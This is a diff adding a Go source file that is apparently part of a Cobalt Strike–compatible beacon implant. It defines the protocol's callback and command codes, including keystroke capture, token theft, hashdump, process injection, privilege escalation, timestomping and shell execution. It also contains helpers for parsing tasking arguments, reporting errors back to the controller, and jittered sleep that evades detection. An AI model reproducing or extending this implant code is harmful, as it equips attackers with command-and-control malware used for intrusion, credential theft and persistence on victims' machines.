@@ -1,0 +1,123 @@
+package command
+
+import (
+	"bytes"
+	"main/config"
+	"main/packet"
+	"main/util"
+	"math/rand"
+	"time"
+)
+
+// all of this can be found in beacon.Job class
+const (
+	CALLBACK_OUTPUT            = 0
+	CALLBACK_KEYSTROKES        = 1
+	CALLBACK_FILE              = 2
+	CALLBACK_SCREENSHOT        = 3
+	CALLBACK_CLOSE             = 4
+	CALLBACK_READ              = 5
+	CALLBACK_CONNECT           = 6
+	CALLBACK_PING              = 7
+	CALLBACK_FILE_WRITE        = 8
+	CALLBACK_FILE_CLOSE        = 9
+	CALLBACK_PIPE_OPEN         = 10
+	CALLBACK_PIPE_CLOSE        = 11
+	CALLBACK_PIPE_READ         = 12
+	CALLBACK_POST_ERROR        = 13
+	CALLBACK_PIPE_PING         = 14
+	CALLBACK_TOKEN_STOLEN      = 15
+	CALLBACK_TOKEN_GETUID      = 16
+	CALLBACK_PROCESS_LIST      = 17
+	CALLBACK_POST_REPLAY_ERROR = 18
+	CALLBACK_PWD               = 19
+	CALLBACK_JOBS              = 20
+	CALLBACK_HASHDUMP          = 21
+	CALLBACK_PENDING           = 22
+	CALLBACK_ACCEPT            = 23
+	CALLBACK_NETVIEW           = 24
+	CALLBACK_PORTSCAN          = 25
+	CALLBACK_DEAD              = 26
+	CALLBACK_SSH_STATUS        = 27
+	CALLBACK_CHUNK_ALLOCATE    = 28
+	CALLBACK_CHUNK_SEND        = 29
+	CALLBACK_OUTPUT_OEM        = 30
+	CALLBACK_ERROR             = 31
+	CALLBACK_OUTPUT_UTF8       = 32
+)
+
+// reference https://github.com/mai1zhi2/SharpBeacon/blob/master/Beacon/Profiles/Config.cs
+// https://sec-in.com/article/1554
+// part of them also can be found in cs jar,but I forget where I found them
+// most of the interaction can be found in beacon.Taskbeacon
+const (
+	CMD_TYPE_SPAWN_IGNORE_TOKEN_X86 = 1
+	CMD_TYPE_EXIT                   = 3
+	CMD_TYPE_SLEEP                  = 4
+	CMD_TYPE_CD                     = 5
+	CMD_TYPE_CHECKIN                = 8
+	CMD_TYPE_INJECT_X86             = 9
+	CMD_TYPE_UPLOAD_START           = 10
+	CMD_TYPE_DOWNLOAD               = 11
+	CMD_TYPE_EXECUTE                = 12
+	CMD_TYPE_GET_UID                = 27
+	CMD_TYPE_TIMESTOMP              = 29
+	CMD_TYPE_PS                     = 32
+	CMD_TYPE_KILL                   = 33
+	CMD_TYPE_PWD                    = 39
+	CMD_TYPE_JOB                    = 40
+	CMD_TYPE_INJECT_X64             = 43
+	CMD_TYPE_SPAWN_IGNORE_TOKEN_X64 = 44
+	CMD_TYPE_LIST_NETWORK           = 48
+	CMD_TYPE_PORT_FORWARD           = 50
+	CMD_TYPE_FILE_BROWSE            = 53
+	CMD_TYPE_MAKEDIR                = 54
+	CMD_TYPE_REMOVE                 = 56
+	CMD_TYPE_UPLOAD_LOOP            = 67
+	CMD_TYPE_FILE_COPY              = 73
+	CMD_TYPE_FILE_MOVE              = 74
+	CMD_TYPE_GET_PRIVS              = 77
+	CMD_TYPE_SHELL                  = 78
+	CMD_TYPE_SPAWN_TOKEN_X86        = 89
+	CMD_TYPE_SPAWN_TOKEN_X64        = 90
+	CMD_TYPE_GET_SYSTEM             = 95
+)
+
+func ParseAnArg(buf *bytes.Buffer) ([]byte, error) {
+	argLenBytes := make([]byte, 4)
+	_, err := buf.Read(argLenBytes)
+	if err != nil {
+		return nil, err
+	}
+	argLen := packet.ReadInt(argLenBytes)
+	if argLen != 0 {
+		arg := make([]byte, argLen)
+		_, err = buf.Read(arg)
+		if err != nil {
+			return nil, err
+		}
+		return arg, nil
+	} else {
+		return nil, nil
+	}
+
+}
+
+func ErrorMessage(err string) {
+	errIdBytes := packet.WriteInt(0) // must be zero
+	arg1Bytes := packet.WriteInt(0)  // for debug
+	arg2Bytes := packet.WriteInt(0)
+	errMsgBytes := []byte(err)
+	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
+	finalPaket := packet.MakePacket(31, result)
+	packet.PushResult(finalPaket)
+}
+func Sleep() {
+	sleepTime := config.WaitTime
+	if config.Jitter != 0 {
+		random := sleepTime * config.Jitter / 100
+		sleepTime += rand.Intn(random*2) - random
+
+	}
+	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
+}
